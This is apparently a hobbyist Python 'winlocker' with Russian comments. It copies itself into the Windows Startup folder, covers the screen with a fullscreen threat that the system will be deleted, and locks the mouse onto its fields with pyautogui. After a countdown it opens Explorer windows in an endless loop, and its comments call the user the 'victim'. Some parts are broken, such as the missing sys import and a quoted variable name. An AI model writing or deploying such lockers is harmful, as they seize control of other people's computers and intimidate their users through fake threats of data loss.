# Импортируем необходимые библиотеки
import tkinter as tk
import os
import random
import pyautogui
from tkinter import *
import tkinter.font as font
import pygame
import shutil

# Добавляем программу в автозагрузку при запуску ПК (если эта программа запускается впервые , тогда ее прописывает в автозагрузку , иначе - ничего не делает)
is_first = True
if os.path.isfile(os.getenv("APPDATA") + '\Microsoft\Windows\Start Menu\Programs\Startup' + '\ '[0] + os.path.basename(sys.argv[0])) is False:
    shutil.copy2(sys.argv[0], os.getenv("APPDATA") + '\Microsoft\Windows\Start Menu\Programs\Startup')
else:
    is_first = False




stroke = " "
password = ("py") # Это ваш пароль для отключения локера , вы можете изменить его 
time = 120
del_text = "It's time to make some BOOOM!" #Этот текст будет выведен через время , определенное в переменной  (time)
 
 
def blockroot():
    pyautogui.click(x=870,y=480)                # Автоклик  на определенные координаты по осям  х и у
    pyautogui.moveTo(x=870,y=480)               # Автонаводка курсора на определенные координаты по осям  х и у 
    root.protocol("WM_DELETE_WINDOW",blockroot) # Обработчик протоколов для взаемодействия  диспетчера окон и приложения 
    root.update()

# Функция для проверки правильности введенного пароля
def check_password(event):
    global stroke 
    stroke=textfield.get()
    if stroke==password:
        root.destroy()
        

pyautogui.FAILSAFE=False                    # Для того , чтобы курсор не вылетел за уровень экрана и не случались сбои в работе программы из-за pyautogui 
                                            # Другими словами -  это  функция отказоустойчивости.
root = Tk()
root.title("The End Of Your System")
root.attributes("-fullscreen",True)

# Ниже работа с изображением на фоне и настройки его отображения на весь экран
photo = PhotoImage(file = r"C:\Users\111\Downloads\fs.png")
w = photo.width()
h = photo.height()
root.geometry("%dx%d+0+0" % (w, h))
panel1 = Label(root, image=photo)
panel1.pack(side='top', fill='both', expand='yes')  
panel1.image = photo

# Обьявление виджетов tkinter
textfield=Entry(root,fg="green")
but= Button(root,text="Разблокировать")
text=Label(root,text="tigerk00",font="System 10",fg="#32CD32",bg="black")
text1=Label(root,text="Don't even think to turn off or restart your device - your system will delete immediately!",font = "System 25",fg="red",bg="black")
l=Label(text=time,font="System 15", bg = 'black' ,  fg = 'white' )
l1=Label(text="The remaining time of your system's life...",fg="white", bg = 'black' , font="System 15")
MyFont = font.Font(family="Helvetica",size=15,weight="bold")
textfield['font']= MyFont
text0 = Label(root , text = "Your system is blocked !" , font = "System 30" , fg="green"  , bg="black")

# Раположение виджетов в окне
text1.place(x = 100 , y = 70)
text0.place(x=700 , y = 0)
text.place(x = 10 , y = 0)
l1.place(x = 10 , y = 150)
l.place(x = 590 ,  y =150)
but.place(x = 900 , y = 520)
textfield.place(width=200,height=30,x=860,y=480)

root.bind("<Return>" , check_password )    # Так как автоклик и автонаводка курсора будет на поле ввода , жертвe физически тяжело будет
root.update()                              # нажать на кнопку , так что пришлось привязать событие с проверкой пароля на клавишу Enter , для ее удобства :)  
pyautogui.click(x = 900 , y = 520)
pyautogui.moveTo(x = 900 , y = 520)

# Вставил ost из Mr. Robot , звучит неплохо :)
pygame.init()
aud=pygame.mixer.Sound(r"C:\Users\111\Downloads\Mr.Robot - Main Theme Song.wav" )
aud.play(-1)                               # Сделал бесконечный цикл для песни (чтобы по окончании она начиналась заново)

while stroke!=password:
    l.configure(text=time)
    root.after(300)
    if time==0:                                                  # Суть строк (89 -95) в следущем - по окончании времени у пользователя начинает открываться папка
        time=del_text                                            # "Документы" , и так до бесконечности , т.к. цикл бесконечный . Окно винлокера сворачивается ,
        i = 1                                                    #  но веселье с папками уже началось. 
        while i<2:                                               # Если же вам нужен просто чистый винлокер , можете спокойно удалить/закоментировать эти строки.      
            all_files_in_directory = os.listdir(r"C:\Windows")
            random_file = random.choice(all_files_in_directory)
            os.system(r"explorer.exe randomfile")
    if time!=del_text:                                           # Обратный отсчет времени
        time=time-1 
        
    blockroot()




root.mainloop()  

